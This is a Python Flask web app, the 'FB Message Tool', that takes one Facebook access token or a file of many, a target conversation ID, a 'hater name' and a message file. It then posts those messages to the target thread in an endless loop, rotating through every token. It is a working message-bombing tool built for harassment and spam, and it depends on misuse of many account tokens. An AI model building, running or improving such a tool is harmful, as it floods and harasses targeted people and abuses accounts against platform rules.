from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = False

headers = {
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
    "referer": "www.google.com",
}

stop_events = {}
threads = {}


def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f"https://graph.facebook.com/v22.0/t_{thread_id}/"
                message = str(mn) + " " + message1
                parameters = {"access_token": access_token, "message": message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"✅ Sent: {message}")
                    else:
                        print(f"❌ Failed ({response.status_code}): {message}")
                except Exception as e:
                    print(f"💥 Error: {str(e)}")
                time.sleep(time_interval)


@app.route("/", methods=["GET", "POST"])
def send_message():
    if request.method == "POST":
        token_option = request.form.get("tokenOption")

        if token_option == "single":
            access_tokens = [request.form.get("singleToken")]
        else:
            token_file = request.files["tokenFile"]
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get("threadId")
        mn = request.form.get("kidx")
        time_interval = int(request.form.get("time"))

        txt_file = request.files["txtFile"]
        messages = txt_file.read().decode().splitlines()

        task_id = "".join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(
            target=send_messages,
            args=(access_tokens, thread_id, mn, time_interval, messages, task_id),
        )
        threads[task_id] = thread
        thread.start()

        return f"Task started with ID: {task_id}"

    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FB Message Tool</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('https://i.ibb.co/NdtZjJrx/34b55d0c232d6b7ba78dde006e979dfc.jpg');
      background-size: cover;
      color: white;
    }
    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 0 15px white;
    }
    .form-control {
      background: transparent;
      color: white;
      border: 1px solid white;
      margin-bottom: 15px;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }
    .stop-section {
      margin-top: 30px;
      padding-top: 20px;
      border-top: 2px solid white;
    }
    label { color: white; }
  </style>
</head>
<body>
  <div class="container mt-5">
    <h1 class="text-center">FB Message Tool</h1>
    
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Select Token Option</label>
        <select class="form-control" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      
      <div id="singleTokenInput">
        <label>Enter Single Token</label>
        <input type="text" class="form-control" name="singleToken">
      </div>
      
      <div id="tokenFileInput" style="display: none;">
        <label>Choose Token File</label>
        <input type="file" class="form-control" name="tokenFile">
      </div>
      
      <div class="mb-3">
        <label>Enter Inbox/Convo UID</label>
        <input type="text" class="form-control" name="threadId" required>
      </div>
      
      <div class="mb-3">
        <label>Enter Your Hater Name</label>
        <input type="text" class="form-control" name="kidx" required>
      </div>
      
      <div class="mb-3">
        <label>Enter Time (seconds)</label>
        <input type="number" class="form-control" name="time" required>
      </div>
      
      <div class="mb-3">
        <label>Choose Message File</label>
        <input type="file" class="form-control" name="txtFile" required>
      </div>
      
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
    
    <div class="stop-section">
      <h4>Stop Task</h4>
      <form method="post" action="/stop">
        <div class="mb-3">
          <label>Enter Task ID to Stop</label>
          <input type="text" class="form-control" name="taskId" required>
        </div>
        <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
      </form>
    </div>
    
    <footer class="text-center mt-4">
      <p>👑 MADE BY YOUR NAME</p>
    </footer>
  </div>
  
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
""")


@app.route("/stop", methods=["POST"])
def stop_task():
    task_id = request.form.get("taskId")
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"✅ Task with ID {task_id} has been stopped."
    else:
        return f"❌ No task found with ID {task_id}."


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)